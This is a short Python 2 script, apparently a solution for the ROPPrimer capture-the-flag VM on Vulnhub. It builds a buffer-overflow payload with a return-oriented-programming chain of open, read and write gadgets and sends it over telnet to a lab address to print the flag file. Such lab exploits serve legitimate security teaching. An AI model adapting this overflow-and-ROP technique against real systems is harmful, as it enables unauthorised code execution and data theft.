#check out the ROPPrimer virtual machine on Vulnhub.
#I haven't seen this code for nearly 6 months so I would just google a walkthrough
import struct
import telnetlib

#pack the data into little endian order, with padding
def p(x):
    line = struct.pack('<L', x)
    return line

#addresses for ROP Gadgets
read_func = 0x8048640
write_func = 0x8048700
open_func = 0x80486d0

pop2ret = 0x8048ef7
pop3ret = 0x8048ef6

#address of the flag in memory
flag = 0x8049128

#create buffer to read the flag
buf = ""
buf += "A"*64
buf += p(open_func)
buf += p(pop2ret)
buf += p(flag)
buf += p(0x0)
buf += p(read_func)
buf += p(pop3ret)
buf += p(0x3)
buf += p(0x0804a000)
buf += p(0x80)
buf += p(write_func)
buf += "FAKE"
buf += p(0x4)
buf += p(0x804a000)
buf += p(0x80)

#connect to server so you can send the created buffer with ROP gadgets
tn = telnetlib.Telnet("192.168.56.101",8888)

#send store
print tn.read_until("> ")
tn.write("store\n")

#send file size
print tn.read_until("> ")
tn.write("%d\n" % (len(buf)+1))

#send file content
print tn.read_until("> ")
tn.write(buf + "\n")

#send file name
print tn.read_until("> ")
tn.write(buf)

#read the flag
print tn.read_all()
